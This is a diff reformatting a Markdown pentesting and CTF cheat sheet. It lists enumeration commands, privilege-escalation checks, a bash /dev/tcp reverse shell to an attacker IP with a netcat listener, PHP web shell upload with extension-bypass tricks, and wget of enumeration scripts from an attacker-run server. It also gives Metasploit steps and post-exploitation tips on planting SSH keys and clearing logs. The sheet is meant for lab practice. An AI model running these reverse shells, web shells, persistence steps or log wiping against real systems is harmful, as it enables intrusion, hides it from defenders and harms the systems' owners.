@@ -54,65 +54,75 @@ A living knowledge base for CTFs, pentesting labs, and real-world practice.
 ```bash
 nmap -sC -sV -A <ip>
 nmap -p- <ip>       # all ports
-FTP
-bash
-Copy
-Edit
+```
+
+### FTP
+
+```bash
 ftp <ip>             # try anonymous login
-SMB
-bash
-Copy
-Edit
+```
+
+### SMB
+
+```bash
 smbclient -L //<ip>/ -N
 smbclient //<ip>/<share> -N
-HTTP
-bash
-Copy
-Edit
+```
+
+### HTTP
+
+```bash
 gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt
-🚀 Privilege Escalation
-Methods
-Misconfigured sudo (sudo -l)
+```
 
-SUID binaries (find / -perm -4000 2>/dev/null)
+---
 
-PATH hijacking
+## 🚀 Privilege Escalation
 
-Writable scripts run by root (e.g. cron jobs)
+### Methods
 
-Kernel exploits (uname -a)
+- Misconfigured sudo (`sudo -l`)
+- SUID binaries (`find / -perm -4000 2>/dev/null`)
+- PATH hijacking
+- Writable scripts run by root (e.g. cron jobs)
+- Kernel exploits (`uname -a`)
 
-Tools
-LinEnum.sh
+### Tools
 
-linpeas.sh
+- `LinEnum.sh`
+- `linpeas.sh`
+- `pspy`
 
-pspy
+### Reverse Shells
 
-Reverse Shells
-bash
-Copy
-Edit
+```bash
 # Attacker
 nc -lvnp <port>
 
 # Victim
 bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
-🐚 Reverse Shell & Web Shell Tricks
-PHP Reverse Shell
-bash
-Copy
-Edit
+```
+
+---
+
+## 🐚 Reverse Shell & Web Shell Tricks
+
+### PHP Reverse Shell
+
+```bash
 cp /usr/share/webshells/php/php-reverse-shell.php shell.php
-Upload Bypass
-Rename to .php5, .phtml
+```
 
-Use double extensions: shell.jpg.php
+### Upload Bypass
 
-🐧 Linux/Unix Essentials
-bash
-Copy
-Edit
+- Rename to `.php5`, `.phtml`
+- Use double extensions: `shell.jpg.php`
+
+---
+
+## 🐧 Linux/Unix Essentials
+
+```bash
 whoami
 id
 hostnamectl
@@ -121,38 +131,44 @@ cat /etc/passwd
 sudo -l
 find / -name user.txt 2>/dev/null
 find / -name root.txt 2>/dev/null
-File Transfer
-bash
-Copy
-Edit
+```
+
+### File Transfer
+
+```bash
 # Serve from attacker
 python3 -m http.server 8000
 
 # On victim
 wget http://<attacker_ip>:8000/LinEnum.sh
-📚 CVE Usage & Exploit Research
-Check service versions (from nmap -sV)
+```
 
-Search for exploits:
+---
 
-https://exploit-db.com
+## 📚 CVE Usage & Exploit Research
 
-https://github.com
+- Check service versions (from `nmap -sV`)
+- Search for exploits:
+  - https://exploit-db.com
+  - https://github.com
+  - https://www.cvedetails.com
+  - `searchsploit <service>`
 
-https://www.cvedetails.com
+---
 
-searchsploit <service>
+## 📁 Common Wordlists & Resources
 
-📁 Common Wordlists & Resources
-Name	Use
-rockyou.txt	Bruteforcing passwords
-SecLists	Directories, payloads, usernames
-pentestmonkey	Reverse shell cheats
+| Name          | Use                              |
+| ------------- | -------------------------------- |
+| rockyou.txt   | Bruteforcing passwords           |
+| SecLists      | Directories, payloads, usernames |
+| pentestmonkey | Reverse shell cheats             |
 
-💥 Metasploit Crash Guide
-bash
-Copy
-Edit
+---
+
+## 💥 Metasploit Crash Guide
+
+```bash
 msfconsole
 search exploit <service>
 use exploit/<path>
@@ -161,15 +177,14 @@ set PAYLOAD <payload>
 set LHOST <your_ip>
 set LPORT <port>
 run
-🧹 Post Exploitation Tips
-Enumerate users and passwords
+```
 
-Check for creds in /var/www, .bash_history, .ssh/
+---
 
-Check cron jobs: cat /etc/crontab
+## 🧹 Post Exploitation Tips
 
-Add your SSH key if writable: ~/.ssh/authorized_keys
-
-Clear logs if needed
-
-
+- Enumerate users and passwords
+- Check for creds in `/var/www`, `.bash_history`, `.ssh/`
+- Check cron jobs: `cat /etc/crontab`
+- Add your SSH key if writable: `~/.ssh/authorized_keys`
+- Clear logs if needed
